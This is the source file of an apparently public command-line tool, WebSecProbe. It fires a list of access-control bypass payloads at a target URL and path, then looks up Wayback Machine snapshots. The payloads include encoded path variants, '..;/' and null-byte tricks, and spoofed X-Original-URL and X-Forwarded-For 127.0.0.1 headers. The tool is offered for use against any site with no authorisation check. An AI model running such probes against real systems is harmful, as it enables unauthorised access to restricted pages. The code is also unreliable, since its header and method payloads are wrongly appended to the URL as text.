# websecprobe/websecprobe/cli.py

import argparse
import requests
import json
import re
import threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from tabulate import tabulate

class WebSecProbe:
    def __init__(self, url, path):
        self.url = url
        self.path = path
        self.results = []
        self.threads = []

    def is_valid_url(self):
        # Check if the URL starts with http:// or https:// and doesn't end with /
        return re.match(r'^https?://[^/]+$', self.url)

    def format_path(self):
        # Replace spaces with hyphens
        self.path = self.path.replace(' ', '-')

    def send_request(self, payload):
        full_url = f"{self.url}/{payload}"
        response = requests.get(full_url)  # Remove verify=False to enable SSL certificate verification
        status_code = response.status_code
        content_length = len(response.content)
        self.results.append([full_url, status_code, content_length])

    def run(self):
        # Validate the URL
        if not self.is_valid_url():
            print("Invalid URL. It should start with http:// or https:// and should not end with /")
            exit(1)

        # Format the path by replacing spaces with hyphens
        self.format_path()

        # List of payloads
        payloads = [
            "",
            f"{self.path}%2e",
            f"{self.path}/.",
            f"{self.path}//",
            f"{self.path}/./",
            f"-H X-Original-URL: {self.path}",
            f"-H X-Custom-IP-Authorization: {self.path} 127.0.0.1",
            f"-H X-Forwarded-For: http://{self.path}127.0.0.1",
            f"-H X-Forwarded-For: {self.path}127.0.0.1:80",
            f"-H X-rewrite-url: {self.path}",
            f"{self.path}%20",
            f"{self.path}%09",
            f"{self.path}?{self.path}",
            f"{self.path}.html",
            f"{self.path}/?anything",
            f"{self.path}#{self.path}",
            f"-H Content-Length:0 -X POST",
            f"{self.path}/*",
            f"{self.path}.php",
            f"{self.path}.json",
            f"-X TRACE {self.path}",
            f"-H X-Host: {self.path}127.0.0.1",
            f"{self.path}..;/",
            f" {self.path};/",
            f"{self.path}/path",  #new payloads from here
            f"{self.path}%2Fpath",
            f"{self.path}%252Fpath",
            f"{self.path}/path;parameter",
            f"{self.path}/path?parameter",
            f"{self.path}/path/../path",
            f"{self.path}%u002Fpath",
            f"{self.path}%252E",
            f"{self.path}%00{self.path}",
            f"{self.path}/path%2Ehtml"
        ]

        for payload in payloads:
            thread = threading.Thread(target=self.send_request, args=(payload,))
            self.threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in self.threads:
            thread.join()

        # Print the results in a table
        table_headers = ["URL", "Status Code", "Content Length"]
        print(tabulate(self.results, headers=table_headers, tablefmt="grid"))

        # Wayback machine code
        print("Wayback machine:")

        # Create Wayback Machine API URL
        wayback_url = f"https://web.archive.org/cdx/search/cdx?url={self.url}/{self.path}&output=json"

        # Fetch snapshots using the Wayback Machine API
        response = requests.get(wayback_url)
        snapshots = json.loads(response.text)

        if snapshots:
            print("Available snapshots:")
            for snapshot in snapshots:
                timestamp = snapshot[1]
                original_url = snapshot[2]
                wayback_url = f"https://web.archive.org/web/{timestamp}/{original_url}"
                print(f"Timestamp: {timestamp}")
                print(f"Original URL: {original_url}")
                print(f"Wayback URL: {wayback_url}")
                print()
        else:
            print("No available snapshots found in Wayback Machine.")

def main():
    # Your banner and social links
    twitter_url = 'https://spyboy.in/twitter'
    discord = 'https://spyboy.in/Discord'
    website = 'https://spyboy.in/'
    blog = 'https://spyboy.blog/'
    github = 'https://github.com/spyboy-productions/WebSecProbe'

    VERSION = '0.0.11'

    R = '\033[31m'  # red
    G = '\033[32m'  # green
    C = '\033[36m'  # cyan
    W = '\033[0m'  # white
    Y = '\033[33m'  # yellow

    banner = r'''                                                                                             
     _ _ _     _   _____         _____         _       
    | | | |___| |_|   __|___ ___|  _  |___ ___| |_ ___ 
    | | | | -_| . |__   | -_|  _|   __|  _| . | . | -_|
    |_____|___|___|_____|___|___|__|  |_| |___|___|___|
         Web Security Assessment Tool               
    '''

    print(f'{C}{banner}{W}')
    print(f'{G}[~] {Y}Version      : {W}{VERSION}')
    print(f'{G}[~] {Y}Created By   : {W}Spyboy')
    print(f'{G} ╰➤ {Y}Twitter      : {W}{twitter_url}')
    print(f'{G} ╰➤ {Y}Discord      : {W}{discord}')
    print(f'{G} ╰➤ {Y}Website      : {W}{website}')
    print(f'{G} ╰➤ {Y}Blog         : {W}{blog}')
    print(f'{G} ╰➤ {Y}Github       : {W}{github}')
    print('\n')

    # Create an argument parser
    parser = argparse.ArgumentParser(description='Web Security Assessment Tool')
    parser.add_argument('url', type=str, help='Target URL (e.g., https://example.com)')
    parser.add_argument('path', type=str, help='Path to assess (e.g., /path/to/assess)')

    # Parse command-line arguments
    args = parser.parse_args()
    url = args.url
    path = args.path

    # Create an instance of WebSecProbe and run it
    probe = WebSecProbe(url, path)
    probe.run()

if __name__ == "__main__":
    main()
